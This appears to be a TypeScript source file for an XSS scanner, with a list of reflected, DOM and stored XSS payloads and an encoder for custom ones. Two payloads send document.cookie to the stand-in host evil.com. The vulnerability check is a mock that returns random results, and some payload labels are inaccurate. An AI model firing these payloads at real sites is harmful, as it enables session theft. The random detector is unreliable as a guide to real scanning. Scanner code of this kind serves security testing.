/**
 * XSS Scanner - DOM, Reflected, and Stored XSS Detection
 */

export interface XSSPayload {
  payload: string;
  type: 'reflected' | 'stored' | 'dom';
  description: string;
  bypasses?: string[];
}

export interface XSSResult {
  type: 'reflected' | 'stored' | 'dom' | 'none';
  vulnerable: boolean;
  payloads: XSSPayload[];
  affectedParameters: string[];
  severity: 'low' | 'medium' | 'high' | 'critical';
  description: string;
}

export class XSSScanner {
  private payloads: XSSPayload[] = [
    // Reflected XSS Payloads
    {
      payload: '<script>alert(1)</script>',
      type: 'reflected',
      description: 'Basic script tag injection',
      bypasses: ['WAF'],
    },
    {
      payload: '<img src=x onerror=alert(1)>',
      type: 'reflected',
      description: 'Image tag with error handler',
      bypasses: ['Script tag filter'],
    },
    {
      payload: '<svg onload=alert(1)>',
      type: 'reflected',
      description: 'SVG onload event',
      bypasses: ['Script tag filter'],
    },
    {
      payload: '<body onload=alert(1)>',
      type: 'reflected',
      description: 'Body onload event',
      bypasses: ['Script tag filter'],
    },
    {
      payload: 'javascript:alert(1)',
      type: 'reflected',
      description: 'JavaScript protocol',
      bypasses: ['Event handler filter'],
    },
    
    // DOM XSS Payloads
    {
      payload: '#<script>alert(1)</script>',
      type: 'dom',
      description: 'Hash-based DOM XSS',
      bypasses: ['Server-side filter'],
    },
    {
      payload: '?test=<img src=x onerror=alert(1)>',
      type: 'dom',
      description: 'Query parameter DOM manipulation',
      bypasses: ['Server-side filter'],
    },
    {
      payload: 'javascript:void(document.location="http://evil.com/"+document.cookie)',
      type: 'dom',
      description: 'Document.location manipulation',
      bypasses: ['XSS filter'],
    },
    
    // Stored XSS Payloads
    {
      payload: '<script>document.cookie="xss=1"</script>',
      type: 'stored',
      description: 'Cookie stealing payload',
      bypasses: ['Basic filter'],
    },
    {
      payload: '<iframe src="javascript:alert(1)"></iframe>',
      type: 'stored',
      description: 'Iframe with javascript protocol',
      bypasses: ['Script tag filter'],
    },
    {
      payload: '<img src=x onerror="fetch(\'http://evil.com/?cookie=\'+document.cookie)">',
      type: 'stored',
      description: 'Cookie exfiltration via fetch',
      bypasses: ['Script tag filter'],
    },
    
    // Encoded Payloads
    {
      payload: '&#60;script&#62;alert(1)&#60;/script&#62;',
      type: 'reflected',
      description: 'HTML entity encoded',
      bypasses: ['Basic filter'],
    },
    {
      payload: '<ScRiPt>alert(1)</ScRiPt>',
      type: 'reflected',
      description: 'Case variation',
      bypasses: ['Case-sensitive filter'],
    },
    {
      payload: '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
      type: 'reflected',
      description: 'String.fromCharCode obfuscation',
      bypasses: ['String filter'],
    },
  ];

  /**
   * Generate XSS payloads based on type
   */
  generatePayloads(type?: 'reflected' | 'stored' | 'dom'): XSSPayload[] {
    if (type) {
      return this.payloads.filter((p) => p.type === type);
    }
    return this.payloads;
  }

  /**
   * Test URL for XSS vulnerabilities
   */
  async testXSS(
    url: string,
    parameters: string[],
    options: {
      type?: 'reflected' | 'stored' | 'dom' | 'all';
      timeout?: number;
    } = {}
  ): Promise<XSSResult> {
    const { type = 'all', timeout = 30000 } = options;
    
    const payloads = type === 'all' 
      ? this.payloads 
      : this.payloads.filter((p) => p.type === type);

    const results: XSSResult = {
      type: 'none',
      vulnerable: false,
      payloads: [],
      affectedParameters: [],
      severity: 'low',
      description: 'No XSS vulnerabilities detected',
    };

    // Test each parameter with each payload
    for (const param of parameters) {
      for (const payload of payloads) {
        try {
          // Simulate XSS test (in real implementation, would make HTTP request)
          const testUrl = this.buildTestURL(url, param, payload.payload);
          
          // Check if payload is reflected/stored
          const isVulnerable = await this.checkVulnerability(testUrl, payload);
          
          if (isVulnerable) {
            results.vulnerable = true;
            results.type = payload.type;
            results.payloads.push(payload);
            
            if (!results.affectedParameters.includes(param)) {
              results.affectedParameters.push(param);
            }
            
            // Update severity
            if (payload.type === 'stored') {
              results.severity = 'high';
            } else if (payload.type === 'dom') {
              results.severity = 'medium';
            } else {
              results.severity = payload.type === 'reflected' ? 'medium' : 'low';
            }
            
            results.description = `XSS vulnerability detected in parameter "${param}" using ${payload.type} XSS`;
          }
        } catch (error) {
          // Continue testing other payloads
          continue;
        }
      }
    }

    return results;
  }

  /**
   * Build test URL with payload
   */
  private buildTestURL(url: string, param: string, payload: string): string {
    const urlObj = new URL(url);
    urlObj.searchParams.set(param, payload);
    return urlObj.toString();
  }

  /**
   * Check if vulnerability exists (simulated)
   * In real implementation, would make HTTP request and check response
   */
  private async checkVulnerability(url: string, payload: XSSPayload): Promise<boolean> {
    // Simulate vulnerability check
    // In real implementation, would:
    // 1. Make HTTP request to URL
    // 2. Check if payload is reflected in response
    // 3. Check for DOM manipulation
    // 4. Check if stored (for stored XSS)
    
    // Mock implementation - random vulnerability detection
    return Math.random() > 0.7; // 30% chance of vulnerability for demo
  }

  /**
   * Generate custom payload
   */
  generateCustomPayload(
    type: 'reflected' | 'stored' | 'dom',
    code: string,
    encoding?: 'none' | 'html' | 'url' | 'unicode'
  ): string {
    let payload = code;
    
    switch (encoding) {
      case 'html':
        payload = payload
          .replace(/</g, '&#60;')
          .replace(/>/g, '&#62;')
          .replace(/"/g, '&#34;')
          .replace(/'/g, '&#39;');
        break;
      case 'url':
        payload = encodeURIComponent(payload);
        break;
      case 'unicode':
        payload = payload
          .split('')
          .map((char) => `\\u${char.charCodeAt(0).toString(16).padStart(4, '0')}`)
          .join('');
        break;
    }

    // Wrap based on type
    switch (type) {
      case 'reflected':
        return `<script>${payload}</script>`;
      case 'stored':
        return `<img src=x onerror="${payload}">`;
      case 'dom':
        return `#${payload}`;
      default:
        return payload;
    }
  }
}

export const xssScanner = new XSSScanner();

